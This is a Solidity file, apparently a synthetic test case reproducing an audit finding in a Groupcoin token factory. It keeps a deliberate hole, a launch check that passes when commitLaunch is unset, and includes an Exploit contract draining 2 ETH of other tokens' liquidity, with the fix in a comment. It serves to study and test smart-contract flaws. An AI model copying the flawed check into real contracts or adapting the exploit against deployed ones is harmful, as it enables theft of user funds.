// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Groupcoin — launchGroupCoinToUniswapV3 accepts an unset commitLaunch (Pashov C-02, finding 41350)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: commitLaunch[tokenId] defaults to 0, and the gate is only
    block.number <= commitLaunch[tokenId]. Any later block therefore launches a token
    that never called enableUniswapV3Launch, and the 2 ETH reserved for other tokens'
    liquidity is taken. The blamed check is preserved verbatim below (@> VULN). */

contract Eth {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract GroupcoinFactory {
    error CantLaunchPoolYet();

    Eth public eth;
    mapping(uint256 => uint256) public commitLaunch;
    uint256 public nextId;
    uint256 public drained;

    constructor(Eth _eth) {
        eth = _eth;
    }

    function launchGroupCoin() external returns (uint256 tokenId) {
        tokenId = ++nextId;
        // enableUniswapV3Launch is not called, so commitLaunch[tokenId] stays 0.
    }

    function enableUniswapV3Launch(uint256 tokenId) external {
        commitLaunch[tokenId] = block.number;
    }

    function launchGroupCoinToUniswapV3(uint256 tokenId) external {
        if (block.number <= commitLaunch[tokenId]) { // @> VULN: unset commitLaunch[tokenId] is 0, so this passes once block.number > 0
            revert CantLaunchPoolYet();
        }
        // FIX: if (block.number <= commitLaunch[tokenId] || commitLaunch[tokenId] == 0) revert CantLaunchPoolYet();
        uint256 amount = eth.balanceOf(address(this));
        eth.transfer(msg.sender, amount);
        drained = amount;
    }
}

contract Exploit {
    Eth public eth; // CREATE nonce 1
    GroupcoinFactory public factory; // CREATE nonce 2
    uint256 public tokenId;

    constructor() {
        eth = new Eth();
        factory = new GroupcoinFactory(eth);
        // The report's PoC deals 2 ETH onto the factory, liquidity that belongs to other tokens.
        eth.mint(address(factory), 2 ether);
    }

    function run() external {
        tokenId = factory.launchGroupCoin();
        require(factory.commitLaunch(tokenId) == 0, "commit unset");
        factory.launchGroupCoinToUniswapV3(tokenId);
        require(factory.drained() == 2 ether, "2 ETH drained");
        require(eth.balanceOf(address(this)) == 2 ether, "attacker holds the liquidity");
        require(eth.balanceOf(address(factory)) == 0, "factory empty");
    }
}
